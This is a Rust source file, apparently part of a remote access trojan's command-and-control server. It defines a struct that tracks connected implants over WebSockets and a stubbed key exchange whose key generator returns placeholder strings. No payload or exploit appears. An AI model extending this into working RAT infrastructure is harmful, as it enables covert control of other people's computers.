use std::net::{IpAddr, SocketAddr};

use futures_util::{
    stream::{SplitSink, SplitStream},
    SinkExt, StreamExt,
};
use serde_json::to_string;
use tokio_tungstenite::WebSocketStream;
use tungstenite::Message;

#[derive(Debug)]
#[allow(dead_code)]
pub struct Instance {
    ip: IpAddr,
    write: SplitSink<WebSocketStream<tokio::net::TcpStream>, Message>,
    read: SplitStream<WebSocketStream<tokio::net::TcpStream>>,
    hostname: String,
    public_key: String,
    private_key: String,
    path: String,
}
impl Instance {
    pub fn new(
        addr: SocketAddr,
        write: SplitSink<WebSocketStream<tokio::net::TcpStream>, Message>,
        read: SplitStream<WebSocketStream<tokio::net::TcpStream>>,
        hostname: String,
        path: String,
    ) -> Instance {
        Instance {
            ip: addr.ip(),
            write,
            read,
            hostname,
            public_key: "".to_string(),
            private_key: "".to_string(),
            path,
        }
    }
    pub fn init_old(
        addr: SocketAddr,
        write: SplitSink<WebSocketStream<tokio::net::TcpStream>, Message>,
        read: SplitStream<WebSocketStream<tokio::net::TcpStream>>,
        hostname: String,
        public_key: String,
        private_key: String,
        path: String,
    ) -> Instance {
        Instance {
            ip: addr.ip(),
            write,
            read,
            hostname,
            public_key,
            private_key,
            path,
        }
    }
    pub fn get_ip(&self) -> IpAddr {
        self.ip
    }
    pub fn get_hostname(&self) -> &str {
        &self.hostname
    }
    pub fn get_path(&self) -> &str {
        &self.path
    }
    pub async fn generate_keys(&mut self) -> (String, String) {
        //Send pong for rat to generate a public key
        self.write.send(Message::from("pong")).await.unwrap();

        let mut public_key = String::from("");
        let mut private_key = String::from("");
        if let Some(message) = self.read.next().await {
            let my_public_key;
            public_key = message.unwrap().to_string();
            //Generate private key and also assign it
            (my_public_key, private_key) = self.generate_my_keys();
            self.public_key = public_key.clone();
            self.private_key = private_key.clone();
            //make
            self.write.send(Message::from(my_public_key)).await.unwrap();
        }
        (public_key, private_key)
    }
    fn generate_my_keys(&self) -> (String, String) {
        ("public".to_string(), "private".to_string())
    }
}
